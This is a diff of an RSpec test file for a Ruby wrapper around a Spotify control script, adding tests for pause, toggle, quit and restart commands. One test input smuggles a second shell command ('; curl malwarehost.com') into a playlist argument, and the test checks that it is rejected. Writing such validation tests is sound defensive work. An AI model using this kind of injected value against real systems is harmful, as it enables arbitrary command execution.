@@ -6,9 +6,9 @@ require_relative "../app"
 require_relative "../spotify"
 
 describe "Spotify" do
-  shared_examples_for "a valid command" do
-    let(:command_stub) { `echo 'hello'` } # Prevent RSpec from executing real commands
+  let(:command_stub) { `echo 'hello'` } # Prevent RSpec from executing real commands
 
+  shared_examples_for "a valid command" do
     it "executes the correct Shpotify command" do
       expect(Spotify).to receive(:`).with(expected_command).and_return(command_stub)
       subject
@@ -30,6 +30,13 @@ describe "Spotify" do
   describe ".stop" do
     subject { Spotify.stop }
     let(:expected_command) { "./spotify.sh stop" }
+
+    it_behaves_like "a valid command"
+  end
+
+  describe ".pause" do
+    subject { Spotify.pause }
+    let(:expected_command) { "./spotify.sh pause" }
 
     it_behaves_like "a valid command"
   end
@@ -130,7 +137,7 @@ describe "Spotify" do
 
     context "uri" do
       let(:share_args) { "uri" }
-      let(:expected_command) { "./spotify.sh share uri" }
+      let(:expected_command) { "./spotify.sh share #{share_args}" }
 
       it_behaves_like "a valid command"
     end
@@ -138,6 +145,37 @@ describe "Spotify" do
     context "url" do
       let(:share_args) { "url" }
       let(:expected_command) { "./spotify.sh share url" }
+
+      it_behaves_like "a valid command"
+    end
+  end
+
+  describe ".toggle" do
+    subject { Spotify.toggle(toggle_args) }
+    let(:expected_command) { "./spotify.sh toggle #{toggle_args}".rstrip }
+
+    context "empty string" do
+      let(:toggle_args) { "" }
+
+      it_behaves_like "an invalid command"
+    end
+
+    context "invalid toggle" do
+      let(:toggle_args) { "invalid" }
+
+      it_behaves_like "an invalid command"
+    end
+
+    context "shuffle" do
+      let(:toggle_args) { "shuffle" }
+      let(:expected_command) { "./spotify.sh toggle #{toggle_args}" }
+
+      it_behaves_like "a valid command"
+    end
+
+    context "repeat" do
+      let(:toggle_args) { "repeat" }
+      let(:expected_command) { "./spotify.sh toggle repeat" }
 
       it_behaves_like "a valid command"
     end
@@ -189,6 +227,27 @@ describe "Spotify" do
       let(:play_args) { "list some_playlist; curl malwarehost.com" }
 
       it_behaves_like "an invalid command"
+    end
+  end
+
+  describe ".quit" do
+    subject { Spotify.quit }
+    let(:expected_command) { "./spotify.sh quit" }
+
+    it_behaves_like "a valid command"
+  end
+
+  describe ".restart" do
+    subject { Spotify.restart }
+    let(:quit) { "./spotify.sh quit" }
+    let(:open) { "open #{Spotify::APP_PATH}" }
+
+    before { allow(Spotify).to receive(:sleep) }
+
+    it "restarts Spotify" do
+      expect(Spotify).to receive(:`).with(quit).once
+      expect(Spotify).to receive(:`).with(open).once.and_return(command_stub)
+      subject
     end
   end
 end
